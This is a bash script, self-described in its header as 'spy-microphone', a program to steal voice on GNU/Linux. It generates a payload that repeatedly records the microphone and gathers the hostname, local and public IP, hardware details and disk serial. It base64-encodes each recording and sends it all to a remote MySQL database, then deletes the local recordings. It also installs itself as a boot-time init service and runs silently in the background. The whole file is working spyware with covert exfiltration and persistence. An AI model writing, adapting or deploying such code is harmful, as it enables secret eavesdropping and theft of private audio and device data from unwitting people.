#!/bin/bash

#
# Copyright (c) 2018 Barchampas Gerasimos <makindosx@gmail.com>
# spy-microphone is a program for steal voice in gnu/linux OS.
#
# spy-microphone is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as
# published by the Free Software Foundation, either version 3 of the
# License, or (at your option) any later version.
#
#
# spy-microphone is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License, version 3,
# along with this program.  If not, see <http://www.gnu.org/licenses/>
#



echo -e "\033[39m                                     .--.                         "
echo -e "\033[39m                                    |o_o |                        "
echo -e "\033[39m                                    |:_/ |                        "
echo -e "\033[39m               SPY MICROPHONE      //   \ \      VOICE - CALLS    "
echo -e "\033[39m                                  (|     | )                      "
echo -e "\033[39m                                 / \_   _/ \                      "
echo -e "\033[39m                                 \___)=(___/                      "

echo -e "" 
echo -e "" 

echo -e "\033[31m           0000\033[0m_____________0000________0000000000000000__000000000000000000+\n\033[31m         00000000\033[0m_________00000000______000000000000000__0000000000000000000+\n\033[31m        000\033[0m____000_______000____000_____000_______0000__00______0+\n\033[31m       000\033[0m______000_____000______000_____________0000___00______0+\n\033[31m      0000\033[0m______0000___0000______0000___________0000_____0_____0+\n\033[31m      0000\033[0m______0000___0000______0000__________0000___________0+\n\033[31m      0000\033[0m______0000___0000______0000_________000___0000000000+\n\033[31m      0000\033[0m______0000___0000______0000________0000+\n\033[31m       000\033[0m______000_____000______000________0000+\n\033[31m        000\033[0m____000_______000____000_______00000+\n\033[31m         00000000\033[0m_________00000000_______0000000+\n\033[31m           0000\033[0m_____________0000________000000007;"


echo -e "\e[39m"


echo "Informations Database"
echo "====================="

read -p 'Host: ' host
read -p 'Username: ' username
read -p 'Password: ' password
read -p 'Database: ' database
read -p 'Seconds Of Record: ' timeout




cat <<EOF >bug.sh

#!/bin/bash

c=1

while [ \$c > 0 ]

do

  max=1440

 for counter in \`seq 1 \$max\`

  do

    timeout $timeout arecord -vv bugs\$counter


HOST="$host"
USERNAME="$username"
PASSWORD="$password"
DATABASE="$database"
COMPUTER_NAME=\$(hostname)
IPV4=\$(ip route get 1.2.3.4 | awk '{print \$7}')
PUBLIC_IP=\$(curl https://ipinfo.io/ip)
OPERATING_SYSTEM=\$(uname -a)
COMPUTER_INFO=\$(lshw)
HARD_DISK_ID_SERIAL_NUMBER=\$(udevadm info --query=all --name=/dev/sda | grep ID_SERIAL_SHORT)
FINGERPRINT=\$(head /dev/urandom | tr -dc A-F0-9 | head -c 32 ; echo '')
SECONDS="$timeout"
RECORD=\$(cat bugs\$counter | base64)


mysql --host=\$HOST --user=\$USERNAME --password=\$PASSWORD \$DATABASE <<END_SCRIPT
insert into records (\\\`computer_name\\\`,\\\`ipv4\\\`,\\\`public_ip\\\`,\\\`operating_system\\\`,\\\`computer_info\\\`,\\\`hard_disk_id_serial_number\\\`,\\\`seconds\\\`,\\\`record\\\`,\\\`fingerprint\\\`) values('\$COMPUTER_NAME','\$IPV4','\$PUBLIC_IP','\$OPERATING_SYSTEM','\$COMPUTER_INFO','\$HARD_DISK_ID_SERIAL_NUMBER','\$SECONDS','\$RECORD','\$FINGERPRINT');
END_SCRIPT


 find -type f -name '*bugs*' -delete

 done

 exit 1

done

EOF


chmod -R 777 bug.sh



sudo cp "bug.sh" "/etc/init.d/bug"

sudo chmod +x /etc/init.d/bug

sudo update-rc.d bug defaults

cat <<EOF >/etc/init/bug.conf



start on runlevel [2345]
stop on runlevel [!2345]


task

respawn

exec bug.sh


EOF



cat <<EOF >/etc/init.d/bug

 #! /bin/bash

case "$1" in
  start)
    echo "Starting Foo..."
    sudo -u foo-user bash -c 'cd /path/to/scripts/ && ./bug.sh'
    ;;
  stop)
    echo "Stopping Foo..."
    sudo -u foo-user bash -c 'cd /path/to/scripts/ && ./bug.sh'
    sleep 2
    ;;
  *)
    echo "Usage: /etc/init.d/foo {start|stop}"
    exit 1
    ;;
esac

EOF

update-rc.d bug defaults


./bug.sh > /dev/null 2>&1 &
